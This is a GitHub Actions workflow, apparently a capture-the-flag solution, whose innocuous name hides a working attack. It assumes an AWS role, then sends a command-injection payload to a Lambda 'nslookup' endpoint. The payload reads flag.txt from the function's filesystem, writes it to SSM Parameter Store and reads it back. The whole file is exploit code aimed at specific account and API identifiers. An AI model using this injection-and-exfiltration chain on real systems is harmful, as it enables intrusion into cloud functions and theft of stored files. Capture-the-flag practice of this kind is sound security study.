name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          echo "=== 1. WRITING FLAG TO SSM PARAMETER STORE ==="
          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(cat /var/task/flag.txt || find / -name flag.txt 2>/dev/null); aws ssm put-parameter --name \"/ctf/flag\" --type \"String\" --value \"$FLAG\" --overwrite --region us-east-1"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          sleep 3
          
          echo "=== 2. READING PARAMETER VIA CICDROLE ==="
          aws ssm get-parameter --name "/ctf/flag" --region us-east-1 --query "Parameter.Value" --output text > ./the_flag.txt
          
          cat ./the_flag.txt
